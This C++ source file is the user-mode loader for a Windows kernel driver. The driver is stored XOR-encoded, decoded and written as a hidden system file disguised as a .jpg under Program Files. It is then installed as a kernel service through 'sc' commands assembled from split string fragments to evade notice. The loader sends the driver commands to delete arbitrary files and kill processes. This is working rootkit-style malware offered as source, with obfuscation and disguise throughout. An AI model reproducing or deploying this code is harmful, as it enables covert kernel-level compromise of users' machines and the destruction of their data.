// LRMAPP.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#pragma warning(disable:4996)
#include <stdlib.h>
#include <stdio.h>
#include <Windows.h>
#include "..\LRM\config.h"
#include "base64.h"
#include "lrmbin.h"
CHAR callKill1(DWORD32 dwPid);

HANDLE hDriver;

void extractDriver() {
    //base64_decode()
    //int b64Len = strlen(LRM_BASE64);
    //char* binresult =(char*)malloc(b64Len + 100);
    //int rLen;
    //base64_decode(LRM_BASE64, binresult, &rLen);
    char xs[100];
     
    //sprintf(xs, "%s%c%c%s", "C", ':', '\\', "img2.jpg");
    HANDLE hFile = CreateFileA("C:\\Program Files\\lolita.jpg",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN,
        NULL

    );
    DWORD r1;
    //OVERLAPPED r2 = 0;
    for (int i = 0; i < x64_Release_LRM_sys_enc_len; i++) {
        x64_Release_LRM_sys_enc[i] ^= (unsigned char)((i + 14) % 256);
    }
    WriteFile(hFile, x64_Release_LRM_sys_enc, x64_Release_LRM_sys_enc_len, &r1, NULL);
    CloseHandle(hFile);
}

void installDriver() {
    system("sc delete kimg");
    //"sc create LRM type= kernel start= demand binPath=C:\\LRM.sys"
    char xs[120];
    //printf("Just a fucking string\n");
    sprintf(xs, "s%stype= ke%ssta%sb%s\\Program Files\\lolita.%s", "c create kimg ", "rnel ", "rt= demand ", "inPath= \"C:", "jpg\"");
    //if (PRODUCT_MODE) {
    //    sprintf(xs, "s%stype= ke%ssta%sb%s\\Program Files\\lolita.%s", "c create kimg ", "rnel ", "rt= auto ", "inPath= \"C:", "jpg\"");
    //}
    printf("%s\n", xs);
    system(xs);
    
    //system("copy LRM.sys C:\\");
    sprintf(xs, "s%ss%sk%s", "c ", "tart ", "img");
    system(xs);
	BOOL x;
}

//#define NMSL_TEST extractDriver(
int main()
{
    //printf("%ld %ld", sizeof(DWORD), sizeof(HANDLE)); return 0;
    //create and start service


    extractDriver();
    //NMSL_TEST);
    installDriver();
    if (PRODUCT_MODE) {
        return 0;
    }
    //system("pause");
    //system("sc stop kimg");
    //system("pause");
    //return 0;
    //
     
    hDriver = CreateFile(SYMBOLIC_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_DEVICE, NULL);
    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("Failed to open device\n");
        return -1;
    }
    printf("Successfully open device\n");
    DWORD32 pidtesti = 66;
    DWORD32 pidtesto;
    DWORD opsize;
    //printf("pidtesti %d\n", pidtesti);
    //bool execres = DeviceIoControl(hDriver, CC_TEST, &pidtesti, sizeof(pidtesti), &pidtesto, sizeof(pidtesto), &opsize, NULL);
    //printf("pidtesto %d opsize %d\n", pidtesto, opsize);
    //DeviceIoControl(hDriver, CC_TEST, &pidtesti, sizeof(pidtesti), &pidtesto, sizeof(pidtesto), &opsize, NULL);
    //printf("pidtesto %d opsize %d execres %d\n", pidtesto, opsize, execres);
    //DWORD pid;
    //scanf("%d", &pid);
    char fileName[100];
    //strcpy(fileName, "1234");
    scanf("%100s", fileName);
     
    DeviceIoControl(hDriver, CC_DEL2, fileName, 100, NULL, 0, &opsize, NULL);


    //callKill1(pid);
    //CloseHandle(hDriver);
    system("pause");
    system("sc stop kimg");
    system("pause");

}

CHAR callKill1(DWORD32 dwPid) {
    
    CHAR result;
    DWORD opSize;
    BOOL execres = DeviceIoControl(hDriver, CC_KILL1, &dwPid, sizeof(dwPid), &result, sizeof(result), &opSize, 0);
    //printf("Called kill1 result: %d, opSize: %d, execres: %d", result, opSize, execres);
    //sizeof(int)
    return result;
}

